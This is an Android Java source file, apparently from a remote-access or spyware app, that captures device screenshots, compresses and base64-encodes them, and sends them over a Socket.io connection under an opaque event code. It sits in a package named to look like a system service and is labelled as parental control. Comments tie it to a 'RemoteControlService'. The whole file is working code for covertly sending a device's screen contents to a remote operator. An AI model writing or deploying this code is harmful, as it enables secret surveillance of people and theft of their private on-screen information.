package com.sys.service.manager;

import android.content.Context;
import android.graphics.Bitmap;
import android.os.Build;
import android.util.Base64;
import android.util.Log;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;

/**
 * Created for Parental Control Screen Capture
 */
public class ScreenManager {

    private Context context;

    public ScreenManager(Context context) {
        this.context = context;
    }

    // Method to convert Bitmap to Base64 string to send over Socket.io
    public static String bitmapToBase64(Bitmap bitmap) {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        
        // Resize image to reduce payload size (max width 450px for faster real-time)
        int targetWidth = 450;
        float ratio = (float) bitmap.getWidth() / bitmap.getHeight();
        int targetHeight = (int) (targetWidth / ratio);
        Bitmap resizedBitmap = Bitmap.createScaledBitmap(bitmap, targetWidth, targetHeight, true);
        
        resizedBitmap.compress(Bitmap.CompressFormat.JPEG, 45, byteArrayOutputStream);
        byte[] byteArray = byteArrayOutputStream.toByteArray();
        Log.e("ScreenManager", "Screenshot size (optimized): " + (byteArray.length / 1024) + " KB");
        return Base64.encodeToString(byteArray, Base64.DEFAULT);
    }
    
    // This will be called from ConnectionManager or RemoteControlService
    public static void sendScreenshot(Bitmap bitmap) {
        try {
            JSONObject data = new JSONObject();
            data.put("image", bitmapToBase64(bitmap));
            IOSocket.getInstance().getIoSocket().emit("x0000sc", data);
        } catch (Exception e) {
            Log.e("ScreenManager", "Error sending screenshot: " + e.getMessage());
        }
    }
}
